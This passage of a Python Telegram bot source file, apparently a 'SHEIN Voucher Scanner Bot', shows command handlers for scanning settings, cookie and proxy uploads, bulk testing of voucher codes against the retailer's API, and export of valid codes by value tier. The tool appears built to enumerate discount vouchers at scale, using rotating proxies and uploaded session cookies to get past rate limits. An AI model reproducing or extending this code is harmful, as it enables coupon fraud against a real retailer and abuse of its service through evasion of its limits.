    if not ctx.args: await update.message.reply_text("Usage: /setlanes <n>"); return
    try: n=int(ctx.args[0]); us.cfg["lanes"]=max(1,n); await update.message.reply_text(f"✅ Lanes = `{us.cfg['lanes']}`", parse_mode="Markdown")
    except: await update.message.reply_text("❌ Invalid number")

async def cmd_setbatch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    if not ctx.args: await update.message.reply_text("Usage: /setbatch <n>"); return
    try: n=int(ctx.args[0]); us.cfg["batch"]=max(10,n); await update.message.reply_text(f"✅ Batch = `{us.cfg['batch']}`", parse_mode="Markdown")
    except: await update.message.reply_text("❌ Invalid number")

async def cmd_setblast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    if not ctx.args: await update.message.reply_text("Usage: /setblast <n>"); return
    try: n=int(ctx.args[0]); us.cfg["blast"]=max(1,n); await update.message.reply_text(f"✅ Blast = `{us.cfg['blast']}`", parse_mode="Markdown")
    except: await update.message.reply_text("❌ Invalid number")

async def cmd_setdelay(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    if not ctx.args: await update.message.reply_text("Usage: /setdelay <sec>"); return
    try: n=float(ctx.args[0]); us.cfg["delay"]=max(0.1,n); await update.message.reply_text(f"✅ Delay = `{us.cfg['delay']}s`", parse_mode="Markdown")
    except: await update.message.reply_text("❌ Invalid number")

# ── VOUCHER COMMANDS ──
async def cmd_vouchers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    codes = parse_voucher_file(us.voucher_file)
    if not codes: await update.message.reply_text("📋 No vouchers found."); return
    txt = f"📋 *Found Vouchers ({len(codes)})*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, c in enumerate(codes[:50], 1): txt += f"`{i}. {c}`\n"
    if len(codes) > 50: txt += f"\n_...and {len(codes)-50} more_"
    await update.message.reply_text(txt, parse_mode="Markdown")

async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    cookie_str = load_cookies(us.cookies_file)
    if not cookie_str: await update.message.reply_text("❌ No cookies! Send cookies.json file"); return
    codes = parse_voucher_file(us.voucher_file)
    if not codes: await update.message.reply_text("❌ No vouchers in voucher.txt"); return
    headers = checker_headers(cookie_str)
    msg = await update.message.reply_text(f"🔍 Testing `{len(codes)}` vouchers...\n\n`[░░░░░░░░░░] 0%`", parse_mode="Markdown")
    ok_count = 0; fail_count = 0
    for i, code in enumerate(codes, 1):
        status, data = apply_voucher(code, headers)
        if status is not None:
            applicable, price, min_purch = extract_voucher_info(data)
            if applicable:
                detail = price
                if min_purch: detail = f"{price} off on min {min_purch}"
                with open(us.applicable_file, "a", encoding="utf-8") as f:
                    f.write(f"{code} | {detail} | \n")
                ok_count += 1
            else:
                with open(us.not_applicable_file, "a", encoding="utf-8") as f:
                    f.write(f"{code}\n")
                fail_count += 1
            reset_voucher(code, headers)
        else:
            fail_count += 1
        if i % 3 == 0 or i == len(codes):
            pct = int(100*i/len(codes)); filled = pct//10
            bar = "█"*filled + "░"*(10-filled)
            try: await msg.edit_text(f"🔍 Testing...\n\n`[{bar}] {pct}%`\n✅ {ok_count} | ❌ {fail_count} | {i}/{len(codes)}", parse_mode="Markdown")
            except: pass
        await asyncio.sleep(1)
    await msg.edit_text(
        f"✅ *Check Complete!*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ Applicable: `{ok_count}`\n❌ Not applicable: `{fail_count}`\n\n"
        f"_Use /applicable to view, /export to export_", parse_mode="Markdown")

async def cmd_applicable(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    vouchers = parse_applicable_file(us.applicable_file)
    if not vouchers: await update.message.reply_text("📋 No applicable vouchers yet. Use /check first."); return
    txt = f"✅ *Applicable ({len(vouchers)})*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for v in vouchers[:40]:
        txt += f"🏷️ `{v['code']}` | {v['price']}\n"
    if len(vouchers) > 40: txt += f"\n_...and {len(vouchers)-40} more_"
    await update.message.reply_text(txt, parse_mode="Markdown")

# ── EXPORT ──
async def cmd_export(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    vouchers = parse_applicable_file(us.applicable_file)
    if not vouchers: await update.message.reply_text("❌ No applicable vouchers to export."); return
    tiers = sorted(set(v["value"] for v in vouchers if v["value"] > 0))
    txt = "📤 Export Vouchers\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for t in tiers:
        count = sum(1 for v in vouchers if v["value"] == t)
        txt += f"💰 /export\\_{t} — Rs.{t} ({count})\n"
    txt += f"\n📦 /export\\_all — All ({len(vouchers)})\n\n⚠️ Exported = REMOVED from list"
    await update.message.reply_text(txt, parse_mode="Markdown")

async def cmd_export_tier(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    cmd = update.message.text.split("@")[0]
    tier = cmd.replace("/export_", "")
    vouchers = parse_applicable_file(us.applicable_file)
    if not vouchers: await update.message.reply_text("❌ No vouchers."); return
    if tier == "all":
        selected = vouchers; remaining = []
    else:
        try: val = int(tier)
        except: await update.message.reply_text("❌ Invalid tier."); return
        selected = [v for v in vouchers if v["value"] == val]
        remaining = [v for v in vouchers if v["value"] != val]
    if not selected: await update.message.reply_text("❌ No vouchers in this tier."); return
    content = "\n".join(v["raw"] for v in selected)
    buf = io.BytesIO(content.encode("utf-8"))
    buf.name = f"vouchers_Rs{tier}_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
    await update.message.reply_document(document=buf,
        caption=f"📤 *Exported {len(selected)} vouchers* (Rs.{tier})\n⚠️ Removed from list", parse_mode="Markdown")
    save_applicable_file(remaining, us.applicable_file)

async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
    if os.path.exists(us.voucher_file): open(us.voucher_file, 'w').close()
    await update.message.reply_text("🗑️ voucher.txt cleared!")

async def cmd_bandwidth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    await update.message.reply_text(
        f"📦 *Bandwidth*\n━━━━━━━━━━━━━━━━━━━━━\n\nAPI Requests: `{bandwidth_stats['requests']:,}`",
        parse_mode="Markdown")

# ── MESSAGE HANDLER ──
async def msg_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    # Cookie file upload
    if update.message.document:
        fname = update.message.document.file_name or ""
        if "cookie" in fname.lower() or upload_state.get(uid) == "cookies":
            file = await update.message.document.get_file()
            await file.download_to_drive(us.cookies_file)
            upload_state[uid] = None
            await update.message.reply_text("✅ Cookies saved to your folder!"); return
    if not update.message.text: return
    state = upload_state.get(uid)
    if state in ("addproxy", "replaceproxy"):
        lines = [l.strip() for l in update.message.text.strip().split("\n") if l.strip()]
        if state == "replaceproxy": us.proxies.clear()
        added = 0
        for line in lines:
            parts = line.split(":")
            if len(parts) == 4: us.proxies.append(Proxy(*parts)); added += 1
        us.save_proxies()
        upload_state[uid] = None
        action = "Added" if state == "addproxy" else "Replaced with"
        await update.message.reply_text(f"✅ {action} `{added}` proxies. Total: `{len(us.proxies)}`", parse_mode="Markdown")

# ══════════════════════════════════════
#  MAIN
# ══════════════════════════════════════
def main():
    print("🎯 SHEIN Voucher Scanner Bot (Multi-User)")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("⚡⚡ Made by RIVEN\n")
    print(f"👑 Owner: {ADMIN_ID}")
    print(f"👥 Users: {len(authorized_users)}")
    print(f"📂 Data: {DATA_DIR}/")

    request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=60.0,
        pool_timeout=30.0,
        connection_pool_size=8,
    )
    app = Application.builder().token(TOKEN).request(request).build()

    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("scan", cmd_scan))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("find", cmd_find))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stats", cmd_stats))
    # Proxy
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("replaceproxy", cmd_replaceproxy))
    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
    app.add_handler(CommandHandler("proxyreload", cmd_proxyreload))
    app.add_handler(CommandHandler("proxystatus", cmd_proxystatus))
    # Config
    app.add_handler(CommandHandler("config", cmd_config))
    app.add_handler(CommandHandler("setlanes", cmd_setlanes))
    app.add_handler(CommandHandler("setbatch", cmd_setbatch))
    app.add_handler(CommandHandler("setblast", cmd_setblast))
    app.add_handler(CommandHandler("setdelay", cmd_setdelay))
    # Vouchers
    app.add_handler(CommandHandler("vouchers", cmd_vouchers))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("applicable", cmd_applicable))
    app.add_handler(CommandHandler("export", cmd_export))
    app.add_handler(CommandHandler("clear", cmd_clear))
    app.add_handler(CommandHandler("bandwidth", cmd_bandwidth))
    # Owner
    app.add_handler(CommandHandler("adduser", cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("listusers", cmd_listusers))
    # Export tiers
    app.add_handler(MessageHandler(filters.Regex(r'^/export_'), lambda u, c: cmd_export_tier(u, c)))
    # Message handler
    app.add_handler(MessageHandler(filters.ALL, msg_handler))

    async def post_init(application):
        await application.bot.set_my_commands([
            BotCommand("start", "🏠 Menu"), BotCommand("scan", "▶️ Start"),
            BotCommand("stop", "⏹️ Stop"), BotCommand("find", "🔍 Lookup"),
            BotCommand("status", "📊 Stats"), BotCommand("config", "⚙️ Config"),
            BotCommand("check", "🔍 Test"), BotCommand("export", "📤 Export"),
        ])
        print("✅ Bot commands set!")
    app.post_init = post_init

    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🤖 Bot is running!")
    app.run_polling()

if __name__ == "__main__":
    main()
